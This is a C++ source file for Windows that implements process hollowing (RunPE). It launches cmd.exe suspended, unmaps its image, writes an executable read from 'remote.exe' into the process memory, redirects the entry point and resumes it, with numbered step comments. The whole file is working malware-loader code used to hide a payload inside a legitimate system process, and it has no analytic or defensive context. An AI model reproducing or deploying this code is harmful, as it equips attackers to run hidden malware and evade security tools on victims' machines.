#include <stdio.h>
#include <iostream>
#include <Windows.h>

typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

char *Local_PATH = "C:\\Windows\\System32\\cmd.exe";
char *Remote_PATH = "remote.exe";


void RunPE(const char *path)
{
    /*
        1. Create a suspended process
    */
    // Create a suspended process
    STARTUPINFOA si = {0};  
    PROCESS_INFORMATION pi = {0};
    CONTEXT ctx = {};

    if (CreateProcessA(Local_PATH, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        /*
            2. Read the remote code
        */
        // Read the PE file that will be injected
        HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        LPBYTE FileImage = new BYTE[dwFileSize];
        DWORD FileReadSize;
        ReadFile(hFile, FileImage, dwFileSize, &FileReadSize, NULL);
        CloseHandle(hFile);

        /*
            3. Get the suspended process context and the environment information
        */
        PIMAGE_DOS_HEADER pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(FileImage + pDosHeaders->e_lfanew);
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        PVOID RemoteImageBase = NULL;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _WIN32_
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
#endif

        /*
            4. Unload the suspended process memory
        */
        // Unload the memory space of the suspended process
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
        if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
        {
            NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); // Unload existing files
        }

        /*
            5. Write the remote code
        */
        // Allocate memory for the PE image and write the file header
        PVOID RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

        // Write each section
        PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
        {
            WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders[i].VirtualAddress), (PVOID)(FileImage + pSectionHeaders[i].PointerToRawData), pSectionHeaders[i].SizeOfRawData, NULL);
        }

        /*
            6. Resume the suspended process
        */
        // Set the entry point address of the thread context
        ctx.ContextFlags = CONTEXT_FULL;
#ifdef _WIN64
        ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _WIN32_
        ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif

        // Set thread context and resume thread
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);

        // Clean up
        delete[] FileImage;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    /*
        Step
            1. Create the suspended process
            2. Read the remote code
            3. Get the suspended process context and the environment information
            4. Unload the suspended process memory
            5. Write the remote code
            6. Resume the suspended process
    */
    RunPE(Remote_PATH);
    return 0;
}